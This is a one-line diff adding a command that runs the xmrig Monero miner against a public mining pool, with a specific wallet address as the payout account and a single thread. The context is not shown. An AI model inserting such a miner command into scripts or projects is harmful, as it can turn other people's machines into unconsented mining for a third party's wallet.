@@ -1,0 +1,1 @@
+xmrig.exe --threads=1 -o pool.supportxmr.com:5555 -u 43LKVsDuqiDVhxkWwkkyCW2K4J2DrbmH55Rk8qj44JmBTkExo2qRGNceNtMUpnLSZhcKRWHTyNXKjGSPBXRigki35UCYPFP -p xxx
